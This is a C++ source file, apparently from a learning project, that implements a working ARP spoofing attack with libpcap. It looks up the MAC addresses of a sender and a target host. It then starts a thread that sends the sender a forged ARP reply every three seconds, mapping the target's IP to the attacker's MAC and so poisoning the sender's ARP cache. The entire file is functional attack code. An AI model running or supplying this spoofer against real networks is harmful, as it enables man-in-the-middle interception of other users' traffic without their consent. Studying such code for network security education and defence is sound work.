#include "arp_spoof.h"
#include <unistd.h>

EthArpPacket gen_arp_req(Mac smac_, Ip sip_, Ip tip_)
{
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac(Mac::broadcastMac());
    packet.eth_.smac_ = Mac(smac_);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(smac_);
    packet.arp_.sip_ = htonl(sip_);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(tip_);

    return packet;
}

EthArpPacket gen_arp_reply(Mac smac_, Mac tmac_, Ip sip_, Ip tip_)
{
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac(tmac_);
    packet.eth_.smac_ = Mac(smac_);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(smac_);
    packet.arp_.sip_ = htonl(sip_);
    packet.arp_.tmac_ = Mac(tmac_);
    packet.arp_.tip_ = htonl(tip_);

    return packet;
}

Mac get_arp_reply_mac(const u_char *packet, Mac dmac_, Ip sip_, Ip tip_)
{
    EthArpPacket *ethArpPacket = (EthArpPacket *)malloc(sizeof(EthArpPacket));

    ethArpPacket = (EthArpPacket *)packet;

    if ((ethArpPacket->eth_.type()) != EthHdr::Arp ||
        ethArpPacket->eth_.dmac() != dmac_ ||
        ethArpPacket->arp_.op() != ArpHdr::Reply)
        return Mac::broadcastMac();

    if (ethArpPacket->arp_.sip() == sip_ &&
        ethArpPacket->arp_.tip() == tip_)
    {
        return Mac(ethArpPacket->arp_.smac_);
    }
    else
        return Mac::broadcastMac();
}

Mac get_mac_via_arp(pcap_t *pcap, Mac myMac, Ip myIp, Ip tip_)
{
    EthArpPacket packet = gen_arp_req(myMac, myIp, tip_);
    Mac smac;

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }

    int count = 1;
    while (true)
    {
        if (count++ % 10 == 0)
            pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));

        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }
        smac = get_arp_reply_mac(packet, myMac, tip_, myIp);

        if (smac != Mac::broadcastMac())
            break;
    }

    return smac;
}

void *t_get_mac_via_arp(void *argv)
{
    ArpTArgs *arpTArgs = (ArpTArgs *)argv;
    ArpReqs arpReqs = arpTArgs->arpReqs_;
    Mac smac = get_mac_via_arp(arpTArgs->pcap_, arpReqs.smac_, arpReqs.sip_, arpReqs.tip_);
    arpTArgs->retMac_ = smac;

    pthread_exit(NULL);
}

int send_arp_reply(pcap_t *pcap, EthArpPacket packet)
{
    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }

    return 1;
}

void *t_send_arp_replys(void *argv)
{
    ArpTArgs *arpTArgs = (ArpTArgs *)argv;
    ArpReqs arpReqs = arpTArgs->arpReqs_;
    EthArpPacket packet = gen_arp_reply(arpReqs.smac_, arpReqs.tmac_, arpReqs.sip_, arpReqs.tip_);

    int i = 0;
    while (true)
    {
        i++;
        send_arp_reply(arpTArgs->pcap_, packet);
        printf("----[sending arp reply [%d]]----\n", i);
        printf("smac : %s \n", std::string(packet.arp_.smac()).c_str());
        printf("tmac : %s \n", std::string(packet.arp_.tmac()).c_str());
        printf("sip : %s \n", std::string(packet.arp_.sip()).c_str());
        printf("tip : %s \n", std::string(packet.arp_.tip()).c_str());
        printf("---------------------------\n");
        sleep(3);
    }

    pthread_exit(NULL);
}

int arp_spoof(ArpSpoofReqs arpSpoofReqs)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(arpSpoofReqs.interface_, BUFSIZ, 1, 1000, errbuf); // BUFSIZ 8192
    if (pcap == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", arpSpoofReqs.interface_, errbuf);
        return -1;
    }

    int status;
    ArpReqs arpReqs = arpSpoofReqs.arpReqs_;
    arpReqs.smac_ = get_mac_via_arp(pcap, arpSpoofReqs.myMac_, arpSpoofReqs.myIp_, arpReqs.sip_);
    arpReqs.tmac_ = get_mac_via_arp(pcap, arpSpoofReqs.myMac_, arpSpoofReqs.myIp_, arpReqs.tip_);

    printf("sender mac:  %s\n", std::string(arpReqs.smac_).c_str());
    printf("target mac:  %s\n", std::string(arpReqs.tmac_).c_str());

    ArpTArgs *arpTArgs = (ArpTArgs *)malloc(sizeof(ArpTArgs));
    arpTArgs->pcap_ = pcap;
    arpTArgs->arpReqs_ = ArpReqs(arpSpoofReqs.myMac_, arpReqs.smac_, arpReqs.tip_, arpReqs.sip_);

    int thr_id;
    pthread_t pthread;
    thr_id = pthread_create(&pthread, NULL, t_send_arp_replys, (void *)arpTArgs);
    if (thr_id < 0)
    {
        perror("pthread0 create error");
        exit(EXIT_FAILURE);
    }

    pthread_join(pthread, (void **)&status);

    pcap_close(pcap);
}

void *t_arp_spoof(void *argv)
{
    ArpSpoofReqs *arpSpoofReqs_t = (ArpSpoofReqs *)argv;
    arp_spoof(*arpSpoofReqs_t);

    pthread_exit(NULL);
}